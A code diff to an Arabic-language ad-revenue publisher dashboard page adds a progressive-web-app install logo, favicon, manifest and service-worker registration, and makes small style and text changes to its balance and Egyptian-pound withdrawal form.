@@ -3,7 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#070b14">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="عوائد الإعلانات">
     <title>بوابة الناشرين | عوائد الحملات الإعلانية والمكافآت الترويجية</title>
+
+    <!-- شعار سطر الويب (Favicon) يظهر في تبويب المتصفح وشاشة الهاتف -->
+    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 120 120'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='0%25' x2='100%25' y2='100%25'%3E%3Cstop offset='0%25' stop-color='%232563eb'/%3E%3Cstop offset='100%25' stop-color='%2310b981'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect width='120' height='120' rx='28' fill='%230f172a'/%3E%3Crect x='6' y='6' width='108' height='108' rx='24' fill='none' stroke='url(%23g)' stroke-width='4'/%3E%3Cpath d='M30 78 L50 56 L66 68 L90 38' fill='none' stroke='url(%23g)' stroke-width='8' stroke-linecap='round' stroke-linejoin='round'/%3E%3Ccircle cx='90' cy='38' r='7' fill='%2310b981'/%3E%3Ctext x='60' y='102' font-family='Arial,sans-serif' font-size='22' font-weight='bold' fill='%23ffffff' text-anchor='middle'%3EAD%24%3C/text%3E%3C/svg%3E">
+    <link rel="apple-touch-icon" href="/app-icon.svg">
+    <link rel="manifest" href="/manifest.json">
+
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -35,7 +45,7 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 2.5rem 1rem;
+            padding: 2rem 1rem;
             position: relative;
             overflow-x: hidden;
         }
@@ -77,6 +87,73 @@
         header {
             text-align: center;
             margin-bottom: 2rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* تصميم الشعار التفاعلي لتثبيت التطبيق */
+        .app-logo-install {
+            cursor: pointer;
+            display: inline-flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+            padding: 0.6rem 1.2rem;
+            border-radius: 20px;
+            background: rgba(30, 41, 59, 0.55);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            transition: all 0.25s ease;
+            user-select: none;
+            box-shadow: 0 8px 25px -5px rgba(0, 0, 0, 0.4);
+        }
+
+        .app-logo-install:hover {
+            transform: translateY(-3px) scale(1.02);
+            border-color: var(--accent);
+            box-shadow: 0 12px 30px -5px var(--accent-glow);
+        }
+
+        .app-logo-install:active {
+            transform: scale(0.98);
+        }
+
+        .logo-top-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-svg-box {
+            width: 52px;
+            height: 52px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 18px var(--primary-glow);
+        }
+
+        .logo-text-group {
+            text-align: right;
+        }
+
+        .logo-brand-name {
+            font-size: 1.1rem;
+            font-weight: 800;
+            color: #fff;
+            display: block;
+            line-height: 1.2;
+        }
+
+        .logo-install-hint {
+            font-size: 0.78rem;
+            color: var(--accent);
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 4px;
         }
 
         .network-tag {
@@ -89,11 +166,11 @@
             border-radius: 50px;
             font-size: 0.8rem;
             color: #60a5fa;
-            margin-bottom: 1rem;
+            margin-bottom: 0.8rem;
         }
 
         header h1 {
-            font-size: 1.9rem;
+            font-size: 1.85rem;
             font-weight: 800;
             margin-bottom: 0.4rem;
             background: linear-gradient(180deg, #ffffff 0%, #cbd5e1 100%);
@@ -104,6 +181,20 @@
         header p {
             color: var(--text-muted);
             font-size: 0.95rem;
+        }
+
+        /* نافذة إرشاد التثبيت السريع */
+        .install-toast {
+            display: none;
+            background: rgba(16, 185, 129, 0.15);
+            border: 1px solid rgba(16, 185, 129, 0.4);
+            color: #ecfdf5;
+            padding: 0.75rem 1.2rem;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            margin-bottom: 1.2rem;
+            text-align: center;
+            width: 100%;
         }
 
         /* مؤشرات الأداء الإعلاني */
@@ -227,6 +318,8 @@
             margin-bottom: 1.5rem;
             padding-bottom: 0.8rem;
             border-bottom: 1px solid var(--card-border);
+            flex-wrap: wrap;
+            gap: 8px;
         }
 
         .card-header h3 {
@@ -498,6 +591,33 @@
 
 <div class="container">
     <header>
+        <!-- الشعار التفاعلي في الصفحة: عند الضغط عليه يقوم بتثبيت الموقع كتطبيق -->
+        <div class="app-logo-install" id="installAppLogo" title="اضغط لتثبيت المنصة كتطبيق على جهازك">
+            <div class="logo-top-row">
+                <div class="logo-svg-box">
+                    <svg width="52" height="52" viewBox="0 0 120 120" xmlns="http://www.w3.org/2000/svg">
+                        <defs>
+                            <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                                <stop offset="0%" stop-color="#2563eb"/>
+                                <stop offset="100%" stop-color="#10b981"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="120" height="120" rx="26" fill="#0f172a"/>
+                        <rect x="5" y="5" width="110" height="110" rx="22" fill="none" stroke="url(#logoGrad)" stroke-width="5"/>
+                        <path d="M28 76 L48 54 L64 66 L90 34" fill="none" stroke="url(#logoGrad)" stroke-width="8" stroke-linecap="round" stroke-linejoin="round"/>
+                        <circle cx="90" cy="34" r="7" fill="#10b981"/>
+                        <text x="60" y="102" font-family="Cairo, Arial, sans-serif" font-size="22" font-weight="800" fill="#ffffff" text-anchor="middle">AD$</text>
+                    </svg>
+                </div>
+                <div class="logo-text-group">
+                    <span class="logo-brand-name">منصة AD$ للتمويل الإعلاني</span>
+                    <span class="logo-install-hint" id="installStatusText">📲 اضغط على الشعار لتثبيت التطبيق</span>
+                </div>
+            </div>
+        </div>
+
+        <div id="installToast" class="install-toast"></div>
+
         <div class="network-tag">
             <span>●</span> شبكة العوائد الإعلانية والشراكات الرقمية
         </div>
@@ -536,11 +656,11 @@
     <div class="balance-card">
         <div class="balance-title">إجمالي عوائد التمويل المتاحة للصرف الفوري</div>
         <div class="balance-amount">
-            <span id="currentBalance">--.--</span>
+            <span id="currentBalance">0.00</span>
             <span class="currency-symbol">$</span>
         </div>
         <div class="egp-equivalent-bar" id="egpBalanceEquivalent">
-            ما يعادل تقريباً: -- ج.م (بسعر البنك الرسمي)
+            ما يعادل تقريباً: 0.00 ج.م (بسعر البنك الرسمي)
         </div>
         <div class="payout-cycle">
             <span class="status-dot"></span>
@@ -570,8 +690,8 @@
                 <label for="payoutMethod">طريقة استلام الأرباح بالجنيه المصري</label>
                 <select id="payoutMethod" required>
                     <option value="" disabled selected>اختر وسيلة الاستلام المفضلة...</option>
-                    <option value="محفظة إلكترونية">محفظة إلكترونية (محافظ ذكية)</option>
-                    <option value="حساب بنكي">تحويل حساب بنكي محلي (إنستاباي / IBAN / رقم الحساب البنكي)</option>
+                    <option value="محفظة إلكترونية">محفظة إلكترونية (فودافون كاش / إنستاباي / محافظ ذكية)</option>
+                    <option value="حساب بنكي">تحويل حساب بنكي محلي (IBAN / رقم الحساب البنكي)</option>
                     <option value="فيزا / ماستركارد">بطاقة دفع بنكية (فيزا / ماستركارد)</option>
                 </select>
             </div>
@@ -629,8 +749,66 @@
     const RENDER_SERVER_URL = "https://your-app.onrender.com";
     const API_BASE = RENDER_SERVER_URL.includes("your-app") ? "" : RENDER_SERVER_URL;
 
+    // =========================================================================
+    // 1. برمجة تثبيت الموقع كتطبيق (PWA) عند الضغط على الشعار
+    // =========================================================================
+    let deferredInstallPrompt = null;
+    const installAppLogo = document.getElementById("installAppLogo");
+    const installStatusText = document.getElementById("installStatusText");
+    const installToast = document.getElementById("installToast");
+
+    // تسجيل عامل الخدمة (Service Worker) لتفعيل ميزة التثبيت في المتصفح
+    if ("serviceWorker" in navigator) {
+        window.addEventListener("load", () => {
+            navigator.serviceWorker.register("/sw.js").catch(() => {});
+        });
+    }
+
+    // التقاط حدث جاهزية التثبيت من المتصفح
+    window.addEventListener("beforeinstallprompt", (e) => {
+        e.preventDefault();
+        deferredInstallPrompt = e;
+        installStatusText.textContent = "📲 اضغط هنا لتثبيت المنصة كتطبيق فوري";
+    });
+
+    // عند اكتمال التثبيت بنجاح
+    window.addEventListener("appinstalled", () => {
+        deferredInstallPrompt = null;
+        installStatusText.textContent = "✓ تم تثبيت التطبيق على جهازك";
+        installToast.style.display = "block";
+        installToast.textContent = "✅ تم تثبيت تطبيق عوائد الإعلانات بنجاح على شاشتك الرئيسية!";
+        setTimeout(() => { installToast.style.display = "none"; }, 5000);
+    });
+
+    // عند الضغط على الشعار في أعلى الصفحة
+    installAppLogo.addEventListener("click", async () => {
+        if (deferredInstallPrompt) {
+            deferredInstallPrompt.prompt();
+            const { outcome } = await deferredInstallPrompt.userChoice;
+            if (outcome === "accepted") {
+                installStatusText.textContent = "✓ جاري تثبيت التطبيق...";
+            }
+            deferredInstallPrompt = null;
+        } else {
+            // إرشاد ذكي إذا كان المستخدم يفتح من آيفون (iOS) أو كان التطبيق مثبتاً بالفعل
+            installToast.style.display = "block";
+            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
+            if (isIOS) {
+                installToast.textContent = "📲 لتثبيت التطبيق على آيفون: اضغط على زر المشاركة (Share) في المتصفح بالأسفل ثم اختر «إضافة إلى الشاشة الرئيسية - Add to Home Screen».";
+            } else if (window.matchMedia("(display-mode: standalone)").matches) {
+                installToast.textContent = "✅ أنت تستخدم المنصة الآن من داخل التطبيق المثبت بالفعل!";
+            } else {
+                installToast.textContent = "📲 لتثبيت التطبيق مباشرة: من قائمة المتصفح العلوية (⋮) اختر «تثبيت التطبيق - Install App» أو «إضافة إلى الشاشة الرئيسية».";
+            }
+            setTimeout(() => { installToast.style.display = "none"; }, 7000);
+        }
+    });
+
+    // =========================================================================
+    // 2. إدارة الرصيد والمؤشرات والسحب بالجنيه المصري
+    // =========================================================================
     let currentAvailableBalance = 0.00;
-    let officialBankRate = 0.00; // السعر الرسمي المعتمد للبنوك
+    let officialBankRate = 56.26;
 
     const balanceElem = document.getElementById("currentBalance");
     const egpBalanceEquivalent = document.getElementById("egpBalanceEquivalent");
@@ -666,7 +844,6 @@
         }) + " ج.م";
     }
 
-    // جلب السعر الرسمي مباشرة في حال فتح الملف على GitHub قبل ربط سيرفر Render
     async function fetchDirectBankRateBackup() {
         try {
             const res = await fetch("https://open.er-api.com/v6/latest/USD");
@@ -686,13 +863,12 @@
         recalculateFormPreview();
     }
 
-    // تحديث المؤشرات الأربعة بناءً على الرصيد الحالي
     function updateAdMetrics(balanceAmount) {
         const balance = Math.max(0, parseFloat(balanceAmount) || 0);
 
         if (balance === 0) {
             metricImpressions.textContent = "0";
-            trendImpressions.textContent = "● تم تصفية العوائد";
+            trendImpressions.textContent = "● في انتظار تحديث العوائد";
             metricEcpm.textContent = "$0.00";
             metricCtr.textContent = "0.00%";
             metricCampaigns.textContent = "0 حملة";
@@ -721,7 +897,6 @@
         metricCampaigns.textContent = `${campaignsCount} حملة`;
     }
 
-    // رسم قائمة السحوبات بالجنيه المصري
     function renderWithdrawalList(list) {
         withdrawListContainer.innerHTML = "";
 
@@ -801,7 +976,6 @@
                 applyServerData(data.balance, data.history, data.exchangeRate);
             }
         } catch (err) {
-            // في حال التشغيل المحلي قبل ربط السيرفر
             updateRateLabels();
             updateAdMetrics(currentAvailableBalance);
         }
@@ -823,7 +997,6 @@
         }
     });
 
-    // حساب الخصم (25%) والتحويل للجنيه المصري لحظياً
     function recalculateFormPreview() {
         const val = parseFloat(amountInput.value) || 0;
         const feeUsd = val * 0.25;
@@ -838,7 +1011,6 @@
 
     amountInput.addEventListener("input", recalculateFormPreview);
 
-    // إرسال طلب السحب
     payoutForm.addEventListener("submit", async (e) => {
         e.preventDefault();
         const requestedAmount = parseFloat(amountInput.value) || 0;
@@ -890,7 +1062,6 @@
         }
     });
 
-    // مسح القائمة بالكامل
     clearListBtn.addEventListener("click", async () => {
         try {
             const res = await fetch(`${API_BASE}/api/clear`, { method: "POST" });
@@ -904,7 +1075,6 @@
         }
     });
 
-    // تشغيل الجلب التلقائي
     fetchDirectBankRateBackup();
     syncWithServer();
     setInterval(syncWithServer, 4000);
